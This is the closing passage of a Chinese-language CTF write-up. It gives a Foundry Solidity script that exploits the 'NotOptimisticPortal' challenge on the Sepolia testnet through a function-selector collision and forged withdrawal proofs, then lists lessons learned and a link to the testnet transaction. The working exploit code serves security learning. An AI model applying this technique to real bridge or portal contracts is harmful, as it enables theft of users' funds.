		console2.log("=== 执行NotOptimisticPortal攻击 ===");
		
		NotOptimisticPortal.ProofData memory proofs;
		
		// 填充证明数据
		proofs.stateTrieProof = vm.envBytes("STATE_TRIE_PROOF_SEPOLIA"); // 替换为实际的证明数据
		proofs.storageTrieProof = vm.envBytes("STORAGE_TRIE_PROOF_SEPOLIA"); // 替换为实际的证明数据
		proofs.accountStateRlp = vm.envBytes("ACCOUNT_STATE_RLP_SEPOLIA"); // 替换为实际的证明数据
		
		// 从环境变量获取RLP编码的区块头
		bytes memory rlpBlockHeader = vm.envBytes("RLP_BLOCK_HEADER_SEPOLIA");
		
		vm.startBroadcast(attackerPrivateKey);
		// 在攻击合约中设置区块头
		exploiterCallback.setRLPBlockHeader(rlpBlockHeader);
		
		// 将缓冲区索引设置为1
		exploiterCallback.setBufferIndex(1);
		
		// 打印提款槽位
		console2.log("提款槽位: %s", vm.toString(getWithdrawalSlot()));
		
		// 执行攻击
		exploiterCallback.exploit(proofs);
		
		vm.stopBroadcast();
		// 验证攻击结果：攻击者已获得代币
		require(
			portal.balanceOf(attacker) > 0,
			"攻击失败：攻击者未收到代币"
		);
		
		console2.log("=== 攻击完成 ===");
		console2.log("攻击者新余额: %s", portal.balanceOf(attacker));
	}
	
	// 调用方式: forge script script/NotOptimisticPortal/NotOptimisticPortal.s.sol:NotOptimisticPortalAttack --sig "getWithdrawalSlot()(bytes32)" --fork-url $RPC_URL --private-key $PRIVATE_KEY
	function getWithdrawalSlot() public returns (bytes32) {
		// 获取存储提款映射的槽位
		
		// 从环境变量获取合约地址并实例化
		exploiterCallback = CallbackExploiter(vm.envAddress("CALLBACK_CONTRACT_ADDRESS"));
		portal = NotOptimisticPortal(vm.envAddress("NOT_OPTIMISTIC_PORTAL_ADDRESS"));
		
		address[] memory receivers = new address[](2);
		bytes[] memory receiversData = new bytes[](2);
		
		console2.log("门户合约地址: %s", address(portal));
		console2.log("回调合约地址: %s", address(exploiterCallback));
		
		// 设置第一个接收者为门户合约
		receivers[0] = address(portal);
		// 编码转移所有权的调用数据
		bytes memory transferOwnershipEncodedCall = abi.encodeCall(
			NotOptimisticPortal.transferOwnership_____610165642,
			(address(exploiterCallback))
		);
		
		// 设置第二个接收者为回调攻击合约
		receivers[1] = address(exploiterCallback);
		// 编码onMessageReceived的调用数据
		bytes memory onMessageReceived = abi.encodeCall(
			CallbackExploiter.onMessageReceived,
			(bytes(""))
		);
		
		// 赋值调用数据数组
		receiversData[0] = transferOwnershipEncodedCall;
		receiversData[1] = onMessageReceived;
		
		console2.log("攻击者地址 %s", exploiterCallback.ATTACKER());
		// 计算提款槽位
		bytes32 slotComputed = _computeMessageSlot(
			exploiterCallback.ATTACKER(),
			AMOUNT_TO_RECEIVE,
			receivers,
			receiversData,
			0 // 盐值
		);
		
		console2.log("提款槽位: %s", vm.toString(slotComputed));
		
		return slotComputed;
	}
	
	// 计算消息槽位（与目标合约逻辑一致）
	function _computeMessageSlot(
		address _tokenReceiver,
		uint256 _amount,
		address[] memory _messageReceivers,
		bytes[] memory _messageDatas,
		uint256 _salt
	) internal pure returns(bytes32) {
		bytes32 messageReceiversAccumulatedHash; // 接收者地址累加哈希
		bytes32 messageDatasAccumulatedHash; // 调用数据累加哈希
		
		if(_messageReceivers.length != 0) {
			for(uint i; i < _messageReceivers.length - 1; i++) {
				messageReceiversAccumulatedHash = keccak256(
					abi.encode(
						messageReceiversAccumulatedHash,
						_messageReceivers[i])
				);
				messageDatasAccumulatedHash = keccak256(
					abi.encode(
						messageDatasAccumulatedHash,
						_messageDatas[i]
					)
				);
			}
		}
		
		// 存储消息处理信息的槽位？
		return keccak256(abi.encode(
			_tokenReceiver,
			_amount,
			messageReceiversAccumulatedHash,
			messageDatasAccumulatedHash,
			_salt // 仅通过盐值进行操纵
		));
	}
}
```

## 总结

1.  大多数严重和高危漏洞都源于复杂代码库中隐藏的简单错误。在本案例中，整个攻击得以实现的“低级”错误，就是没有仔细校验涉及的函数选择器。
2.  关注最核心的关键点。在我看来，本关卡的核心突破口是分析`onlyOwner`修饰符的实现逻辑。
3.  理解底层数据结构。在这个挑战中，理解默克尔帕特里夏树以及如何生成有效的证明是攻击的关键（这也是我花费时间最长的部分）。

这个CTF我花了大约3天时间解决：一整天用来发现函数选择器冲突的问题，另外两天用来生成有效的证明并彻底理解默克尔帕特里夏树。这正是我喜欢的CTF类型。感谢[Draiakoo](https://x.com/Draiakoo)带来的乐趣 :D

## 攻击证明

[Sepolia测试网交易记录](https://sepolia.etherscan.io/tx/0xa14fa5b9af500fea8b9430c55fa5f990a469c9ec98451e353f90f44c61a32596)
